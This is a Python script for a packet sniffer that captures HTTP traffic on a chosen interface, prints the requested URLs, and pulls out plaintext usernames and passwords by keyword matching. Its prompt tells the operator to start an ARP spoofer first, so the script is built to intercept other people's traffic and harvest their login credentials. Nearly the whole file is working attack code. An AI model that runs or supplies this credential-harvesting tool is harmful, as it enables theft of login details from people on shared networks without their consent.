'''
USAGE:
python script.py

Just say yes
'''

# import libraries
import time
from colorama import Fore
from colorama import Style

import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re

# Global variables
choice = "Y"

# get current mac
def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ipconfig"])
        return re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(output)).group(0)

    except:
        pass

# get current IP
import subprocess
import re

def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ipconfig"])
        output = output.decode()
        ip_matches = re.findall(r'IPv4 Address[.\s]+:\s+([0-9.]+)', output)
        for match in ip_matches:
            if match != "127.0.0.1":  # Exclude localhost IP
                return match
    except subprocess.CalledProcessError:
        pass
    return None


# get_login_info
def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
            #if it contain the raw fild then print that field post request
            load = packet[scapy.all.Raw].load
            load_decode = load.decode()
            keywords = ["username","user","email","pass","login","password","UserName","Password"]
            for i in keywords:
                if i in load_decode:
                    return load_decode

# url_extractor:
def url_extractor(packet):
    #get the http layer of the packet
    #packet.show() or packet.summary()
    http_layer= packet.getlayer('HTTPRequest').fields
    #get the ip layer of the packet
    ip_layer = packet.getlayer('IP').fields
    #Print them in a readable form
    print(ip_layer["src"] , "just requested \n" ,http_layer["Method"].decode()," ",http_layer["Host"].decode(), " " ,http_layer["Path"].decode() )
    return

# raw_http_request:
def raw_http_request(packet):
    httplayer = packet[http.HTTPRequest].fields
    print("-----------------***Raw HTTP Packet***-------------------")
    print("{:<8} {:<15}".format('Key','Label'))
    try:
        for k, v in httplayer.items():
            try:
                label = v.decode()
            except:
                pass
            print("{:<40} {:<15}".format(k,label))
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")
    print("---------------------------------------------------------")
    # TO PRINT A SOLE RAW PACKET UNCOMMENT THE BELOW LINE
    # print(httplayer)

# print the IP table
def ip_table():
    #get all the interface deatils in with psutil in a variable
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f'{Fore.GREEN}Interface','Mac Address',f'IP Address{Style.RESET_ALL}'])
    for k, v  in addrs.items():
        mac = get_current_mac(k)
        ip = get_current_ip(k)
        if ip and mac:
            t.add_row([k,mac,ip])
        elif mac:
            t.add_row([k,mac,f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k,f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}",ip])
    print(t)

# process sniffed packets
def process_sniffed_packet(packet):
    #funtion to monitor the packets
    #we check that the packet hac the layer httprequest
    if packet.haslayer(http.HTTPRequest):
        #if the packet has the http request then we check that it contain the RAW fied of the packet
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        test = get_login_info(packet)
        #if get_login_info found some then print those
        if test:
            print(f"{Fore.GREEN}[+] Username OR password is Send >>>> ", test ,f"{Style.RESET_ALL}")
        #To Print the raw Packet
        if (choice=="Y" or choice == "y"):
            raw_http_request(packet)

# sniff the packets
def sniff(interface):
    #scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter="port 80")
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# main_sniff:
def main_sniff():
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
    try:
        global choice
        choice = input("[*] Do you want to to print the raw Packet : Y?N : ")
        ip_table()
        interface = input("[*] Please enter the interface name : ")
        print("[*] Sniffing Packets...")
        sniff(interface)
        print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
        time.sleep(3)

# call the main function
# Start packet sniffing here
main_sniff()